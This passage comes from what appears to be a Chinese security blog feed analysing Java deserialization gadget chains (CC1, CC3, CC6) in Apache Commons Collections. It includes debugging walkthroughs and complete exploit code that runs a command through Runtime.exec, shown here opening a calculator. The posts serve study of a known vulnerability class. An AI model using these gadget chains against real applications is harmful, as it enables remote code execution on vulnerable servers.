class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;asd&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="comment">//创建AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotation</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotation.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotation.newInstance(Target.class,transformedmap);</span><br><span class="line">        unserialize(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;1.序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;2.反序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>日常弹计算器。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/15.png" class><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>到目前为止复现了三条典型的cc链，剩下的cc链就是经典类之间排列组合。之后不会在专门复现剩下的cc链，遇到的时候再看。反序列化之路任重而道远。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化-cc6链分析</title>
      <link href="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>继续分析CC链了。上一篇文章分析了CC1链，这条链子限制特别多，jdk版本的限制，Commons Collections版本的限制，所以这条链子其实并不是很好用。那么这篇文章主要分析CC6链，这条链子通用，几乎没有一些所谓的版本限制，而且这条链子可以说是结合了CC1链和URLDNS链，学了这两条链子后再分析这条CC6链，就会发现很容易了。注：此篇文章在URLDNS和CC1链分析文章的基础上编写。</p><h2 id="CC6链分析"><a href="#CC6链分析" class="headerlink" title="CC6链分析"></a>CC6链分析</h2><p>这条链子的利用点还是没有变的，依旧是InvokerTransformer类的transform方法，</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/1.png" class><p>因为执行类Runtime类不能序列化，所以需要配合ChainedTransformer类与反射生成实例执行命令，直接照抄下来。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>依旧是从后往前找，这里走到了ChainedTransformer类的transform方法。</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/2.png" class><p>这里我们找到LazyMap类的get方法，这里需要满足Map里不能存在指定的key才能进入到if里面。</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/3.png" class><p>这里的key可控，再看该类的构造方法。</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/4.png" class><p>用户可控，这里是protected修饰符，那么就找装饰器函数了。</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/5.png" class><p>老套路了。接着继续找哪个类的什么方法调用了get方法。在TiedMapEntry类的getValue方法中调用，</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/6.png" class><p>它又被本类的hashCode函数调用。</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/7.png" class><p>hashCode？很熟悉了，是URLDNS链的起始函数。那么我们肯定就能猜到入口类就是HashMap了，入口为HashMap的readObject函数，调用hash(key)，而今调用任意类的hashCode函数。</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/8.png" class><p>让key赋值为TiedMapEntry类的实例，去调用它的hashCode方法，此时这一整条链就对接上了。所以这一条CC6链大致为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject-&gt;TiedMapEntry.hashCode-&gt;LazyMap.get-&gt;ChainedTransformer.transform-&gt;Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>在我们向HashMap实例put键值对的时候，此时就已经调用了hashCode函数，跟进put方法，</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/9.png" class><p>也会调用hash，进而调用hashCode。所以此时我们需要修改链子上的某个值来切断这条链子。put完后，利用反射再把值修改过来。这也是URLDNS链的老问题了。那么决定修改LazyMap里的值，具体代码实现：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">fieldfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">fieldfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">fieldfactory.set(lazymap,chainedTransformer);</span><br></pre></td></tr></table></figure><p>但是此时反序列化并没有弹出计算器。在TiedMapEntry类的hashCode函数下个断点调试一下。</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/10.png" class><p>此时key有值，为aaa，继续跟进，调用get方法。</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/11.png" class><p>满足不了这个if判断，链子就从这断了。那么具体是什么原因呢？还是put的原因，在put执行的时候，也是走了一半的链子，当它走到LazyMap的get方法时</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/12.png" class><p>此时map里面是没有key的，进入到if判断里面后，会把我们传进来的key给put进去，此时map里面就有key了。在反序列化的时候，这里存在key，满足不了if判断就走不下去了。所以在map执行put函数后把我们传进来的key给删掉就好了。到此问题全部解决。完整CC6链EXP：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc6.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        fieldfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldfactory.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;1.序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;2.反序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>日常弹计算器，嘿嘿。</p><img src="/2023/03/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6%E9%93%BE%E5%88%86%E6%9E%90/13.png" class><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>反序列化之路任重而道远。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化-cc1链分析</title>
      <link href="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="Commons-Collections简介"><a href="#Commons-Collections简介" class="headerlink" title="Commons Collections简介"></a>Commons Collections简介</h2><p>Commons Collections是Apache软件基金会的一个开源项目，它提供了一组可复用的数据结构和算法的实现，旨在扩展和增强Java集合框架，以便更好地满足不同类型应用的需求。该项目包含了多种不同类型的集合类、迭代器、队列、堆栈、映射、列表、集等数据结构实现，以及许多实用程序类和算法实现。它的代码质量较高，被广泛应用于Java应用程序开发中。本篇文章就是分析Commons Collections3.1版本下的反序列化问题，针对于它的攻击链也被称为cc1链。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>选择jdk版本为8u65，因为漏洞在8u71的版本就被修复了。下载地址：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html%E3%80%82">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html。</a></p><p>CommonsCollections的版本选择3.2.1，不能太高，太高也是没有漏洞的。添加Maven依赖下载：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>另外，为了方便调试我们还需要java源码，因为源码中大多都是class文件，不方便阅读和查找。所以需要下载openjdk对应的源码，链接：<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4%EF%BC%8C%E7%82%B9%E5%87%BBzip%E4%B8%8B%E8%BD%BD%EF%BC%8C%E8%A7%A3%E5%8E%8B%E6%88%90%E6%96%87%E4%BB%B6%E5%A4%B9%E3%80%82">https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4，点击zip下载，解压成文件夹。</a></p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/1.png" class><p>将jdk8u65中的src.zip里面的文件解压到src文件夹中，另外将下载解压好的文件夹中的sun文件夹复制粘贴到src文件夹目录下，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/2.png" class><p>在IDEA中，选择目录结构，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/3.png" class><p>将jdk中的src文件路径添加到源路径中，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/4.png" class><p>此时，我们就可以调试源码了。虽然网上很多了，但是还是有必要在前面说一下。</p><h2 id="cc1链分析"><a href="#cc1链分析" class="headerlink" title="cc1链分析"></a>cc1链分析</h2><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><p>此链的漏洞利用点在Commons Collections库中的Transformer接口，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/5.png" class><p>再寻找继承于Transformer接口的类，快捷键alt+crtl+b快速查找。有很多都继承了这个接口，我们定位到InvokerTransformer类中，此类可以被序列化，找到重写的Transform方法，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/6.png" class><p>这就很有意思，通过反射调用任意类的任意方法。其中的参数都是通过该类的构造函数控制，也是我们所能控制的。</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/7.png" class><p>接下来实例化该类看看能不能命令执行，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCtest04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下代码，成功弹出计算器。</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/8.png" class><p>漏洞利用点有了，接下来就是逆推构造调用链，最终定位到某个类的readObject方法里。</p><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>我们是在transform方法里执行命令的，所以接下来找哪个类调用了transform方法。右键点击查找用法可快速查找什么类调用了transform方法。共有二十四处调用，这些调用的地方我们都可以看看，但为了节约时间，我直接定位到TransformedMap类的checkSetValue方法，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/9.png" class><p>valueTransformer通过构造器赋值，但是函数类型为protected，只能本类调用。</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/10.png" class><p>在该类找到decorate方法，类似于装饰器。它实例化了本类，能够调用TransformedMap构造器并为valueTransformer赋值。那么回到checkSetValue方法，我们已经可以控制valueTransformer，那么接下来找哪个类的哪个方法调用了该方法。只有一处调用，MapEntry类的setValue方法。</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/11.png" class><p>我们知道Entry代表map中的一个键值对，实际上MapEntry类重写了Map的setValue方法，跟进AbstractMapEntryDecorator抽象类，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/12.png" class><p>我们先通过对Map的遍历触发setValue方法，主要思路：实例化一个Map，put一个键值对，然后通过TransformedMap的decorate方法进行封装，最后进行遍历。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCtest04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry: transformedmap.entrySet())&#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在decorate方法下断点调试一下，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/13.png" class><p>此时，valueTransformer参数赋值为InvokerTransformer对象，步入，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/14.png" class><p>接着调用构造器，把InvokerTransformer对象赋值给valueTransformer，走到遍历键值对的时候，调用setValue方法，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/15.png" class><p>此时就调用了TransformedMap的checkSetValue方法。value的值为Runtime对象。</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/16.png" class><p>步入，最后就调用了InvokerTransformer的transform方法。</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/17.png" class><p>最终执行命令，弹出计算器。那么就说明此链是走的通的，还是逆向查找，看看哪个类的哪个函数调用了setValue方法，如果是readObject类调用了那就再好不过了。</p><h3 id="入口类"><a href="#入口类" class="headerlink" title="入口类"></a>入口类</h3><p>事实就是那么巧，在AnnotationInvocationHandler类的readObject方法调用了setValue方法。</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/18.png" class><p>大致的链子到此就结束了，但仍有几个问题需要解决。</p><h4 id="Runtime类不能被反序列化"><a href="#Runtime类不能被反序列化" class="headerlink" title="Runtime类不能被反序列化"></a>Runtime类不能被反序列化</h4><p>可以通过反射获取到它的class对象，class对象是可以被反序列化的，跟进看一下：</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/19.png" class><p>一般的反射执行命令的写法为：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCtest02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">runtime</span> <span 